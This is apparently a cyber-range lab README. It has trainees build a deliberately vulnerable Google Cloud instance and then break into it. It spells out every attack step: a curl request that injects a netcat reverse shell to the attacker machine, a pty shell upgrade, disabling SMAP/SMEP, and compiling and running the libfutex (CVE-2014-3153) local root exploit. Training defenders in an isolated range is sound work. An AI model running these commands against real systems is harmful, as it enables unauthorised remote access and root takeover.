# Shell Shock / libfutex Privilege Escalation Example
  
This scenario can be used to train operators to leverage a Shell Shock vulnerability in a PHP web page, along with the 'libfutex' Local Privilege Escalation.

- [Shell Shock](https://www.exploit-db.com/exploits/35146)
- [libfutex](https://www.exploit-db.com/exploits/35370)

## Scenario features

| Feature | Availability | Implemented With |
| --- | ---| --- |
| Targets | Yes | GCE |
| Attackers | Yes | GCE |
| VPC | Yes | VPC |
| Network logs | Yes | VPC Flow Logs |
| PCAPs | No | - |

## Artifacts

* [Terraform Build script](main.tf)
* [Terraform Variables file](terraform.tfvars)
* [Blue Ansible playbook](blue35370.yml)

## Instructions

1. Login to https://console.cloud.google.com/
2. Start the Cloud Shell
3. Clone this repo

```
git clone https://github.com/MikeStorrs/cyber.git
cd cyber
```

4. Use Terraform to Deploy Cyber Range 

```
terraform init
terraform apply

  Enter a value: yes
```

5. SSH to the blue instance `gcloud compute ssh blue-35370 --zone us-east4-a`
6. Accept SSH Key Generation and Set SSH Passphrase

```
Do you want to continue (Y/n)?  Y
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): <PASSPHRASE>
Enter same passphrase again: <PASSPHRASE>
```

7. Clone the meetup, cyber-range-target, and exploit-curation repos

```
git clone https://github.com/MikeStorrs/cyber.git
git clone https://github.com/redteam-project/cyber-range-target
git clone https://github.com/redteam-project/exploit-curation
```

8. Run Ansible script to make this instance vulnerable to Shellshock and libfutex

```
sudo ansible-playbook cyber/blue35370.yml > ~/ansible.out
```

9. Wait for the instance to reboot, then re-log in and remove Supervisor Mode Access Prevention and (NOTE NEED TO ADD nosmap / nosmep to Ansible Script)

```
gcloud compute ssh blue-35370 --zone us-east4-a
sudo grubby --args "nosmap nosmep" --update-kernel /boot/vmlinuz-3.10.0-123.1.2.el7.x86_64
sudo reboot
```

10. Now relogin and scan for exploitable vulnerabilities with `lem`

```
gcloud compute ssh blue-35370 --zone us-east4-a
sudo pip install lem
sudo lem host assess --curation exploit-curation --kind stride --score 090000
sudo lem exploit copy --id 35146 --source exploit-database --destination /var/www/html --curation exploit-curation
sudo mv /var/www/html/exploit-database-35146.txt /var/www/html/index.php
```

11. Our remote code execution vulnerability is now ready to exploit. Now start two new Cloud Shell tabs and ssh to red-1 from both.

```
gcloud compute ssh red-1 --zone us-east4-a
```

12. In the first `red-1` shell, install Netcat and start a listener on port 4444.

```
nc -nlv 4444
```

13. In the second `red-1` shell, exploit the Shellshock vulnerability we staged in step 10. Replace the 10.150.0.3 IP address with your blue-35370 Internal IP and the 10.150.0.2 with your red-1 Internal IP.

```
curl -X GET 'http://10.150.0.3/index.php?cmd=nc%20-nv%2010.150.0.2%204444%20-e%20/bin/bash'
```

14. Now in the first `red-1` shell, you should have a connection to `blue-35370`. Use this Python trick to get a tty and invoke a Bourne shell.

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

15. Inside the new shell, Create a virtualenv, install lem, and look for a privilege escalation vulnerability.

```
cd /tmp
virtualenv venv
source venv/bin/activate
pip install lem
git clone https://github.com/redteam-project/exploit-curation
lem host assess --curation exploit-curation --kind stride --score 000009
```

Note that there is currently a [bug](https://github.com/redteam-project/lem/issues/5) in lem that prevents the exploit that maps to CVE-2014-3153 from returning, but for purposes of this lab we know that it maps to EDBID 35370.

16. Stage the exploit and pop root. 

```
lem exploit copy --curation /tmp/exploit-curation --source exploit-database --id 35370 --destination /tmp/
mv exploit-database-35370.txt exploit.c
gcc -lpthread exploit.c -o exploit
./exploit
id -a
```